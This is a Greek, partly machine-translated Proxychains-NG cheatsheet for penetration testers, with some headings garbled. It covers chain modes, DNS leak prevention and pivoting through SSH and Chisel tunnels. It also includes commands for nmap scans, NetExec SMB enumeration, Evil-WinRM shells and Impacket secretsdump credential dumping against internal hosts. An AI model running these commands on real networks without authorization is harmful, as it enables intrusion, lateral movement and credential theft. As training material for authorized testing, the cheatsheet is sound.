<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Proxychains - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<p align="center">
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Pivoting & Tunneling">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Protocols">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Δρομολογήστε τα τυπικά εργαλεία δικτύωσης Linux CLI δυναμικά μέσω multi-hop SOCKS και διακομιστή μεσολάβησης HTTP μέσω LD_PRELOAD</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Επισκόπηση και πώς λειτουργούν οι αλυσίδες μεσολάβησης](#-επισκόπηση--πώς-εργάζονται οι αλυσίδες μεσολάβησης)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Configuration Files & Lookup Hierarchy](#-configuration-files--lookup-hierarchy)
- [Chaining Modes Explained](#-chaining-modes-explained)
  - [`dynamic_chain` (Συνιστάται)](#dynamic_chain-recommended)
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#random_chain)
- [Αποτροπή διαρροών DNS (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [Διαμόρφωση λιστών μεσολάβησης](#-configuring-proxy-lists)
- [Περιστροφικές ροές εργασίας](#-pivoting-workflows)
  - [SSH Dynamic SOCKS Proxy (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [Σμίλη & Ligolo-ng SOCKS Relay] (#chisel--ligolo-ng-socks-relay)
- [Tool Integration & Gotchas](#-tool-integration--gotchas)
  - [Nmap with Proxychains (Why `-sS` Fails)](#nmap-with-proxychains-why--ss-fails)
  - [Εργαλεία καταλόγου Active Directory (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση και πώς λειτουργούν οι αλυσίδες μεσολάβησης

**Proxychains** (σύγχρονο ενεργό πιρούνι: **Proxychains-NG** / `proxychains4`) επιτρέπει την εκτέλεση οποιασδήποτε δυναμικής εντολής μέσω μονής ή πολλαπλών αλυσίδων διακομιστών SOCKS4, SOCKS5 ή HTTP(S).

Λειτουργεί με την προφόρτωση μιας προσαρμοσμένης βιβλιοθήκης αγκίστρου (`libproxychains4.so`) χρησιμοποιώντας τον μηχανισμό δυναμικής σύνδεσης (`LD_PRELOAD`). Αυτό παρεμποδίζει τις κλήσεις API υποδοχής (`connect()`, `gethostbyname()`) που πραγματοποιούνται από εφαρμογές προορισμού και ανακατευθύνει την κυκλοφορία TCP τους στη διαμορφωμένη αλυσίδα διακομιστή μεσολάβησης με διαφάνεια.

---

## 📥 Εγκατάσταση
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ Αρχεία διαμόρφωσης & Ιεραρχία αναζήτησης

Το Proxychains αναζητά το αρχείο διαμόρφωσής του με την ακόλουθη αυστηρή σειρά προτεραιότητας:

1. Ορίστηκε διαδρομή στη μεταβλητή περιβάλλοντος `PROXYCHAINS_CONF_FILE`.
2. Το αρχείο διαβιβάστηκε μέσω της σημαίας `-f` (`proxychains4 -f ./myproxy.conf <command>`).
3. `./proxychains.conf` στον τρέχοντα κατάλογο εργασίας.
4. `$(HOME)/.proxychains/proxychains.conf`.
5. `/etc/proxychains4.conf` (Προεπιλογή συστήματος).

---

## 🔗 Επεξήγηση των τρόπων αλυσίδων

Επεξεργαστείτε το `/etc/proxychains4.conf` για να επιλέξετε τον αλγόριθμο δρομολόγησης αλυσίδας:

### `dynamic_chain` (Συνιστάται)
Παραλείπει αυτόματα τους νεκρούς διακομιστές μεσολάβησης στη λίστα χωρίς να διακόψει τη σύνδεση. Εάν ο διακομιστής μεσολάβησης #1 είναι ανεβασμένος, ο διακομιστής μεσολάβησης #2 είναι απενεργοποιημένος και ο διακομιστής μεσολάβησης #3 είναι ανεβασμένος, διαδρομές κυκλοφορίας μέσω 1 -> 3.
```ini
dynamic_chain
# strict_chain
```
### `strict_chain`
Ακολουθεί αυστηρά τη διαμορφωμένη σειρά διακομιστή μεσολάβησης. Εάν οποιοσδήποτε διακομιστής μεσολάβησης στην αλυσίδα αποτύχει ή λήξει, η όλη σύνδεση απορρίπτεται.
```ini
strict_chain
```
### `round_robin_chain`
Κυκλοφορεί στη λίστα διακομιστή μεσολάβησης διαδοχικά για κάθε νέο αίτημα σύνδεσης.
```ini
round_robin_chain
chain_len = 2
```
### `random_chain`
Επιλέγει τυχαία διακομιστές μεσολάβησης από τη λίστα έως και `chain_len`.

---

## 🛡️ Πρόληψη διαρροών DNS (`proxy_dns`)

Μία από τις πιο επικίνδυνες αποτυχίες του OPSEC κατά τη διάρκεια εξωτερικής αναγνώρισης ή εσωτερικής περιστροφής είναι η διαρροή ερωτημάτων DNS στον τοπικό ISP ή την πύλη προορισμού.

Βεβαιωθείτε ότι το `proxy_dns` είναι ενεργό στο `/etc/proxychains4.conf`:
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 Διαμόρφωση λιστών μεσολάβησης

Στο κάτω μέρος του `/etc/proxychains4.conf`, κάτω από το `[ProxyList]`:
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 Περιστρεφόμενες ροές εργασίας

### SSH Dynamic SOCKS Proxy (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### Ρελέ Σμίλη & Ligolo-ng ΚΑΛΤΣΕΣ

Όταν εκτελείτε σήραγγες πελάτη-διακομιστή Chisel:
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ Ενσωμάτωση εργαλείων & Gotchas

### Nmap με Proxychains (Γιατί αποτυγχάνει το `-sS`)

> [!ΠΡΟΕΙΔΟΠΟΙΗΣΗ]
> Οι διακομιστής μεσολάβησης SOCKS υποστηρίζουν μόνο καθιερωμένες συνεδρίες TCP. **Οι σαρώσεις SYN Stealth (`-sS`) θα αποτύχουν ή θα κολλήσουν** επειδή απαιτούν χειρισμό ακατέργαστων υποδοχών που δεν υποστηρίζονται μέσω SOCKS!
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### Εργαλεία καταλόγου Active Directory (NetExec, Evil-WinRM, Impacket)
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Εκτέλεση εντολής μέσω διακομιστή μεσολάβησης** | `proxychains4 <command> [args]` |
| **Προσαρμοσμένο αρχείο διαμόρφωσης** | `proxychains4 -f ./custom.conf <command>` |
| **Αθόρυβη εκτέλεση (Χωρίς banner)** | `proxychains4 -q <command>` |
| **Εσωτερικός στόχος σάρωσης TCP** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **Εσωτερικό αίτημα Ιστού** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| **Εσωτερική δοκιμή SQLMap** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| **Εσωτερικό NetExec Probe** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ Αμυντικές Θεωρήσεις & OPSEC

1. **Διαρροές DNS:** Εάν το `proxy_dns` σχολιαστεί, το σύστημά σας θα επιλύσει ονόματα κεντρικών υπολογιστών μέσω τοπικού DNS, ειδοποιώντας τις Blue Teams για στοχευμένα ονόματα κεντρικών υπολογιστών.
2. **Ταχύτητα και καθυστέρηση:** Αλυσίδα πολλαπλών διαμεσολαβητών ενώσεων χρόνου μετ' επιστροφής (RTT). Ορίστε εύλογα χρονικά διαστήματα (`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
3. **Στατικά δυαδικά:** Στατικά δυαδικά μεταγλωττισμένα (π.χ. δυαδικά αρχεία Go/Rust που δεν συνδέουν το `libc.so`) παρακάμπτουν τα άγκιστρα `LD_PRELOAD` και δεν θα δρομολογηθούν μέσω των αλυσίδων μεσολάβησης.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Αυτό το cheatsheet προορίζεται μόνο για εξουσιοδοτημένες δοκιμές διείσδυσης, δεσμεύσεις της Red Team και εκπαιδευτική έρευνα. Η δρομολόγηση της κυκλοφορίας χωρίς εξουσιοδότηση απαγορεύεται αυστηρά.